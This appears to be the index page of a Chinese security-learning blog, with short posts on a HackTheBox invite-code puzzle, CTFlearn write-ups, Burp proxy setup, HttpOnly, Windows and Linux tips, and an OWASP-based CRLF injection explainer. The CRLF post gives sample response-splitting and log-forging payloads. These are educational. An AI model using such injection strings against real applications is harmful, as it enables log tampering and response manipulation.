          					    <span class="posted-in"><a href='Checklist.html'>Checklist</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446861280668.html">
                
                  <h1>hackthebox邀请码</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>不打算好好玩的麻烦不要瞎注册，大量的垃圾账号只会污染整个生态环境。</p>
</blockquote>

<p>进入注册页面，观察页面js文件会找到以下内容：</p>

<pre class="line-numbers"><code class="language-javascript">eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!&#39;&#39;.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--){if(k[c]){p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c])}}return p}(&#39;1 i(4){h 8={&quot;4&quot;:4};$.9({a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\&#39;/d/e/n\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:&quot;7&quot;,5:&quot;6&quot;,b:\&#39;/d/e/k/l/m\&#39;,c:1(0){3.2(0)},f:1(0){3.2(0)}})}&#39;,24,24,&#39;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#39;.split(&#39;|&#39;),0,{}))
</code></pre>

<p>1、然后把这段代码放到 <a href="http://jsbeautifier.org/">http://jsbeautifier.org/</a> 进行美化，得出：<br/>
2、</p>

<pre class="line-numbers"><code class="language-javascript">function verifyInviteCode(code) {
    var formData = {
        &quot;code&quot;: code
    };
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        data: formData,
        url: &#39;/api/invite/verify&#39;,
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: &quot;POST&quot;,
        dataType: &quot;json&quot;,
        url: &#39;/api/invite/how/to/generate&#39;,
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
</code></pre>

<p>可以看出上述代码是让我们访问：<a href="https://www.hackthebox.eu/api/invite/generate">https://www.hackthebox.eu/api/invite/generate</a><br/>
然后修改请求方式为post<br/>
于是就得到了：</p>

<pre class="line-numbers"><code class="language-javascript">{&quot;success&quot;:1,&quot;data&quot;:{&quot;code&quot;:&quot;VlJQS1QtQUNXRUstT0tYREwtQ0lZQVUtS0NZSlU=&quot;,&quot;format&quot;:&quot;encoded&quot;},&quot;0&quot;:200}
</code></pre>

<p>将code进行base64解码，就得到了邀请码。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:28 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='CTF.html'>CTF</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446858089976.html">
                
                  <h1>burpsuite设置上游代理</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p><img src="media/15446858089976/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/></p>

<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
2、开启上游代理<br/>
3、在burp的图中所示位置设置上游代理</p>

<p>打完收工</p>

<h2 id="toc_0">参考链接</h2>

<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:23 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E6%8A%80%E5%B7%A7.html'>技巧</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15433912730163.html">
                
                  <h1>FOEENSICS 101</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p>题目：<a href="https://ctflearn.com/problems/96">https://ctflearn.com/problems/96</a><br/>
<img src="http://images.lonelyor.org/ctflearn-96-1.png" alt="ctflearn-96-1"/><br/>
访问域名，然后会下载一张图片。<br/>
接下来我们使用十六进制编码器打开这张图片，会发现：<br/>
<img src="http://images.lonelyor.org/ctflearn-96-2.png" alt="ctflearn-96-2"/><br/>
标红部分即是flag。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/28 15:47 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='ctflearn.html'>ctflearn</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15433875205785.html">
                
                  <h1>BASIC INJECTION 基本注入</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p>题目：<a href="https://ctflearn.com/problems/88">https://ctflearn.com/problems/88</a><br/>
解：<br/>
访问题目中提到的：<a href="https://web.ctflearn.com/web4/">域名</a><br/>
<img src="http://images.lonelyor.org/ctflearn-basic-injection-1.png" alt="ctflearn-basic-injection-1"/><br/>
然后输入payload，得到以下数据，方框中的即为flag。<br/>
<img src="http://images.lonelyor.org/ctflearn-basic-injection-2.png" alt="ctflearn-basic-injection-2"/></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/28 14:45 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='ctflearn.html'>ctflearn</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15433756568203.html">
                
                  <h1>HttpOnly</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p>HttpOnly是 Set-Cookie HTTP响应头中包含的附加标志。生成cookie时使用httponly标志有助于降低客户端脚本访问受保护cookie的风险。</p>

<p>如果HTTP响应头中包含HttpOnly标志，则无法通过客户端脚本访问cookie。因此即使存在xss跨站脚本漏洞，并且用户意外访问到恶意链接，浏览器也不会向第三方透露cookie（前提是浏览器支持HttpOnly）。</p>

<p>参考链接：</p>

<blockquote>
<p><a href="https://www.owasp.org/index.php/HttpOnly">https://www.owasp.org/index.php/HttpOnly</a></p>
</blockquote>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/28 11:27 上午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC.html'>xss跨站脚本</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15428715286450.html">
                
                  <h1>windows右键添加管理员获得所有权</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>右键添加获得管理员所有权是个比较方便的功能。</p>
</blockquote>

<p>打开记事本或者别的文本编辑器，然后写入如下内容:</p>

<pre class="line-numbers"><code class="language-cmd">Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\*\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\*\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
</code></pre>

<p>然后另存为：管理员获得所有权.reg<br/>
文件名可以随便写，但是后缀记得写成reg（改成这个后缀后文件图标就会变成一个破碎蓝色魔方）。<br/>
然后右键以管理员身份运行，若弹框注册表xxx的，同意就行了。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/22 15:25 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Windows%E6%8A%80%E5%B7%A7.html'>Windows技巧</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15428714021434.html">
                
                  <h1>linux将shell脚本添加到系统命令的方法</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>可以自定义一些shell脚本，用来提高执行常用组合命令的效率。还有一种方式是使用alias命令。</p>
</blockquote>

<p>两种方法：<br/>
1、直接把shell脚本放到/usr/local/bin ，然后添加权限 <code>sudo chmod +x xxx.sh</code> 就ok了。这样是在本地用户添加命令。<br/>
root用户添加命令则把脚本放在 /usr/bin 即可。<br/>
2、使用软连接的方式<code>ln -s 【源文件或目录】【目标文件或目录】</code><br/>
注意要使用绝对路径。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/22 15:23 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='Linux%E6%8A%80%E5%B7%A7.html'>Linux技巧</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15428712896668.html">
                
                  <h1>CRLF注入</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>文章翻译自OWASP的<a href="https://www.owasp.org/index.php/CRLF_Injection">CRLF_Injection</a></p>
</blockquote>

<p>CRLF即回车Carriage Return (ASCII 13, \r) 和 换行 Line Feed (ASCII 10, \n)。他们被用于注释掉一行的终止。不过不同系统的处理方式有点不同。windows中，CR和LF都被用于注释掉一行的结尾，而linux/unix中只需要一个LF。在HTTP协议中，CRLF序列始终用于一行的终止。<br/>
当用户设法将CRLF提交到应用程序时，可能发生CRLF注入攻击，这通常是通过修改HTTP参数或URL来完成。</p>

<p>CRLF注入可能产生这样的问题：</p>

<ul>
<li>HTTP响应拆分</li>
<li>日志注入<br/>
## HTTP响应拆分<br/>
通常，当出现以下情况时会发生HTTP响应拆分</li>
<li>数据通过不受信任的来源进入Web应用程序，如HTTP请求。</li>
<li>数据包含在发送给Web用户的HTTP响应标头中，而不会对恶意字符进行验证。<br/>
HTTP响应拆分是达到目的的手段而不是目的本身。<br/>
攻击方式如下：攻击者将恶意数据传递给易受攻击的应用程序，应用程序将数据包含在HTTP响应中。<br/>
要成功利用漏洞，应用程序必须允许<strong>包含有 CR（回车，即 %0d 或者 \r\n）和 LF（换行符，%0a 或者 \n）的输入在header中</strong>和<strong>底层平台必须容易注入这样的字符</strong>。</li>
</ul>

<p><em>大多数现代应用程序服务器(无论用什么语言编写的代码)，都已经不存在HTTP响应拆分漏洞。</em></p>

<p>下面上一段java代码来举例说明：</p>

<pre class="line-numbers"><code class="language-java">String author = request.getParameter(AUTHOR_PARAM);
...
Cookie cookie = new Cookie(&quot;author&quot;, author);
      cookie.setMaxAge(cookieExpiration);
      response.addCookie(cookie);
</code></pre>

<p>上述代码的意思是：从客户端HTTP请求中接受参数（author），并将其设置在HTTP响应的cookie头中。<br/>
如果我们正常提交数据(author=lonelyor)，HTTP响应应该是这样：</p>

<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
...
Set-Cookie: author=Jane Smith
...
</code></pre>

<p>但是，由于源代码中的cookie是由未经验证的用户输入组成的，因此如果我们提交恶意代码<code>Hacker By xxx\r\nContent-Length:45\r\n\r\n...</code>则HTTP响应将被拆分为原始响应和伪造响应。</p>

<pre class="line-numbers"><code class="language-java">HTTP/1.1 200 OK
    ...
    Set-Cookie: author=Hacker By xxx
    Content-Length: 999
    
    &lt;html&gt;恶意内容...&lt;/html&gt; (这个例子中为第999个字符)
    原始内容以1000开头, 现在被浏览器忽略了...
</code></pre>

<h3 id="toc_0">危害</h3>

<p>攻击者构建任意HTTP响应的能力可能导致以下攻击：<br/>
跨用户污染（Cross-User_Defacement）——利用条件很苛刻<br/>
缓存中毒（Cache_Poisoning）——利用条件很苛刻<br/>
XSS跨站脚本攻击<br/>
页面劫持</p>

<h2 id="toc_1">日志注入</h2>

<p>将未经验证的用户输入写入日志文件可能导致攻击者伪造日志或者将恶意内容注入日志。<br/>
以下情况可能导致日志伪造漏洞：</p>

<ul>
<li>数据从不受信任的来源进入应用程序</li>
<li>数据将写入应用程序或者系统日志文件</li>
</ul>

<p>下面上一段java代码来举例说明：</p>

<pre class="line-numbers"><code class="language-java">...
String val = request.getParameter(&quot;val&quot;);
try {
  int value = Integer.parseInt(val);
}
catch (NumberFormatException) {
  log.info(&quot;Failed to parse val = &quot; + val);
}
...
</code></pre>

<p>上述代码的功能是，从请求对象中读取整数值，如果该值无法解析为整数，则会记录输入，并显示一条错误信息。<br/>
如果用户提交字符串“one”，则会记录以下条目<br/>
<code>INFO: Failed to parse val=one</code><br/>
然而，如果攻击者提交字符串<code>one%0a%0aINFO:+User+logged+out%3dbadguy</code>则会在日志中显示：</p>

<pre class="line-numbers"><code class="language-text">    INFO: Failed to parse val=one

    INFO: User logged out=badguy
</code></pre>

<p>显然攻击者可以使用相同机制插入任意日志条目。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/22 15:21 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E6%B3%A8%E5%85%A5.html'>注入</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15428711597348.html">
                
                  <h1>burpsuite设置上游代理</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>burpsuite的使用技巧之一，设置上游代理。比如测试境外网站时可能需要[fanqiang]才能访问，此时这个技巧就能用得上了。</p>
</blockquote>

<p><img src="http://images.lonelyor.org/burp%E8%AE%BE%E7%BD%AE%E4%B8%8A%E6%B8%B8%E4%BB%A3%E7%90%8620180823161146.png" alt="burp设置上游代理20180823161146"/></p>

<p>1、在浏览器中设置burp代理以保证可以抓包<br/>
2、开启上游代理<br/>
3、在burp的图中所示位置设置上游代理</p>

<p>打完收工</p>

<h2 id="toc_0">参考链接</h2>

<p><a href="http://www.360zhijia.com/360anquanke/191737.html">http://www.360zhijia.com/360anquanke/191737.html</a></p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/22 15:19 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15428708110510.html">
                
                  <h1>更优雅的使用Hexo写博客</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>曾经的博客是使用 Hexo 写的，我觉得Hexo这种在文章前面写上元信息的方式很棒。然而，每此写markdown文档都要输入这些元信息，这很麻烦，所以就写了个shell脚本来自动化输入文件元信息的过程。<br/>
代码如下：</p>
</blockquote>

<pre class="line-numbers"><code class="language-bash">#!/bin/bash

printf &quot;请输入文件名(example.md)，记得写后缀!\n&quot;
read -p &quot;文件名是: &quot; filename
# 这里的title取文件名不取后缀
echo &quot;title: &quot;${filename%.*} &gt;&gt; $filename
echo &quot;author: lonelyor&quot; &gt;&gt; $filename
echo &quot;language: zh-CN&quot; &gt;&gt; $filename
echo &quot;tags:&quot; &gt;&gt; $filename
echo &quot;  - 标签&quot; &gt;&gt; $filename
echo &quot;categories:&quot; &gt;&gt; $filename
echo &quot;  - 分类&quot; &gt;&gt; $filename
time=$(date &quot;+%Y-%m-%d %H:%M:%S&quot;)
echo &quot;date: ${time}&quot;&gt;&gt; $filename
echo &quot;---&quot; &gt;&gt; $filename
echo &quot;&gt; description: &quot; &gt;&gt; $filename
# printf和echo都是输出，&gt;&gt;表示追加，&gt;会覆盖文件
# shell中使用变量需要先定义变量，然后使用时加 $
# read 用来创建文件，文件名从终端获取
</code></pre>

<p>展示效果如下:</p>

<pre class="line-numbers"><code class="language-md">title: 如何优雅的创建markdown文件
author: lonelyor
language: zh-CN
tags:
  - Hexo
  - markdown
categories:
  - 技术杂文
date: 2018-09-06 17:42:40
---
&gt; description: 若爱请深爱，若不爱请离开。
</code></pre>

<p>接下来说说如何使用(仅限linux、macos，或者说可以执行bash的环境，win用户请自行转换成bat)：<br/>
首先，创建一个名叫 md.sh 的文件（名字你爱咋咋地），把代码copy进去。<br/>
然后，<code>ln -s /md文件绝对路径 /usr/local/bin/md</code> ,这条语句的意思就是创建一个软连接，把 md.sh 连接到当前用户的 md 命令上。<br/>
最后，打开终端输入 md ，然后输入要创建的markdown文件名（如：test.md），即可在当前目录下创建带有元信息的markdown文件。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/11/22 15:13 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html'>奇淫巧技</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
              


			<div class="row">
			  <div class="large-6 columns">
			  <p class="text-left" style="padding-top:25px;">
			   
			  </p>
			  </div>
			  <div class="large-6 columns">
			<p class="text-right" style="padding-top:25px;">
			 <a href="all_1.html">&raquo; Next Page</a> 
			</p>
			  </div>
			</div>
		</div>
	</div><!-- large 8 -->

 <div class="large-4 medium-4 columns">
  <div class="hide-for-small">
    <div id="sidebar" class="sidebar">
          <div id="site-info" class="site-info">
            
              <div class="site-a-logo"><img src="http://images.lonelyor.org/lonelyornotesico.jpeg" /></div>
            
          </br>
                <h1>lonelyorのblog</h1>
                <div class="site-des">一个用来记录学习笔记的网站</div>
                <div class="social">









<a target="_blank" class="github" target="_blank" href="https://github.com/AlShelley/lonelyorNotes" title="GitHub">GitHub</a>
<a target="_blank" class="email" href="mailto:lonelyor.org@gmail.com" title="Email">Email</a>
  <a target="_blank" class="rss" href="atom.xml" title="RSS">RSS</a>
                
              	 </div>
          	</div>

             

              <div id="site-categories" class="side-item ">
                <div class="side-header">
                  <h2>分类</h2>
                </div>
                <div class="side-content">

      	<p class="cat-list">
        
            <a href="Web%E6%94%BB%E9%98%B2.html"><strong>Web攻防</strong></a>
        
            <a href="%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html"><strong>奇淫巧技</strong></a>
        
            <a href="%E7%B3%BB%E7%BB%9F%E6%94%BB%E9%98%B2.html"><strong>系统攻防</strong></a>
        
            <a href="CTF.html"><strong>CTF</strong></a>
        
            <a href="%E8%99%9A%E6%8B%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4.html"><strong>虚拟实验室</strong></a>
         
        </p>


                </div>
              </div>

              <div id="site-categories" class="side-item">
                <div class="side-header">
                  <h2>最新文章</h2>
                </div>
                <div class="side-content">
                <ul class="posts-list">
	      
		      
			      <li class="post">
			        <a href="15446897185202.html">从零开始的DVWA之环境搭建</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15446893463166.html">xss常用payload</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15446892905759.html">同源策略</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15446891028198.html">xss测试备忘录</a>
			      </li>
		     
		  
		      
			      <li class="post">
			        <a href="15446890453437.html">xss基础</a>
			      </li>
		     
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		  
		      
		   
		  		</ul>
                </div>
              </div>
        </div><!-- sidebar -->
      </div><!-- hide for small -->
</div><!-- large 4 -->

</div><!-- row -->

 <div class="page-bottom clearfix">
  <div class="row">
   <p class="copyright">Copyright &copy; 2015
Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
Theme used <a target="_blank" href="http://github.com">GitHub CSS</a>.</p>
  </div>
</div>

        </section>
      </div>
    </div>

  
    

    <script src="asset/js/foundation.min.js"></script>
    <script>
      $(document).foundation();
      function fixSidebarHeight(){
        var w1 = $('.markdown-body').height();
          var w2 = $('#sidebar').height();
          if (w1 > w2) { $('#sidebar').height(w1); };
      }
      $(function(){
        fixSidebarHeight();
      })
      $(window).load(function(){
          fixSidebarHeight();
      });
     
    </script>

    



  </body>
</html>
